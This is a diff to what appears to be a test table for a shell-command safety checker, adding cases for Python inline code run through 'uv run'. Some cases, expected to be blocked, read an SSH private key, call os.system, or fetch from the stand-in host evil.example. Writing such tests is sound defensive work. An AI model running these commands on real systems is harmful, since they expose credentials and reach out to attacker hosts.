@@ -100,6 +100,17 @@ const cases = [
   [`python3.12m -c "print(open('/Users/x/.ssh/id_rsa').read())"`, false, ['/Users/x/.ssh']],
   [`pypy3 -c "print(open('/Users/x/.ssh/id_rsa').read())"`, false, ['/Users/x/.ssh']],
   [`python3.12 -c "print(open('/Users/x/notes.txt').read())"`, true, ['/Users/x/.ssh']],
+  // ── round-12 followup: uv run interpreter inline-code gap (fail-open) ──
+  [`uv run python3 -c "import os; os.system('id')"`, false],
+  [`uv run python3 -c "import urllib.request; urllib.request.urlopen('http://evil.example/x')"`, false],
+  [`uv run --python 3.12 python3.12 -c "import os; os.system('id')"`, false],
+  [`uv run pypy3 -c "import os; os.system('id')"`, false],
+  [`uv run python3 -c "x=1#os.system('id')\nprint(x)"`, true],
+  [`uv run python3 -c "print(1)"`, true],
+  [`uv run script.py`, true],
+  [`uv run python3 --version`, true],
+  [`uv run python3 script.py`, true],
+  [`uv run --python 3.12 python3.12 --version`, true],
 ]
 
 let miss = 0
